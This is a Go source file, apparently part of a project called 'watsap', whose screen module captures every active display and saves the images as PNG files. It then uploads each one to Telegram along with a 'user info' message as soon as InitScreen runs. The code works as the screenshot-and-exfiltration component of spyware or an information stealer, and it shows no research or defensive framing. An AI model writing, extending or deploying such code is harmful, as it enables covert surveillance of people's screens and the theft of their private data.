package screen

import (
	"fmt"
	"image/png"
	"log"
	"os"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/telegram"

	"github.com/kbinani/screenshot"
)

var FileName = ""

// take fullscreen screenshot
func TakeScreenshot() {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		log.Println("Headless system")
		return // Removed os.Exit(1) to avoid killing the whole app
	}

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("[Screen][ERROR] Failed to capture screen %d: %v", i, err)
			continue
		}
		
		fileName := getScreenshotFile(i)
		file, err := os.Create(fileName)
		if err != nil {
			log.Printf("[Screen][ERROR] Failed to create file %s: %v", fileName, err)
			continue
		}

		if err := png.Encode(file, img); err != nil {
			log.Printf("[Screen][ERROR] Failed to encode PNG %s: %v", fileName, err)
		}
		file.Close() // Explicit close inside loop
		
		log.Printf("[Screen][INFO] Screenshot saved to: %v", fileName)
	}
}

func SendScreenshot() {
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		fileName := getScreenshotFile(i)
		telegram.TgSendFile(fileName, messages.GetUserInfoMsg())
		if config.DebugMode {
			os.Remove(fileName)
		}
	}
}

func getScreenshotFile(index int) string {
	return fmt.Sprintf("%s/%s-screenshot-%d.png", config.WaDir, *config.UserID, index)
}

func InitScreen() {
	TakeScreenshot()
	SendScreenshot()
}
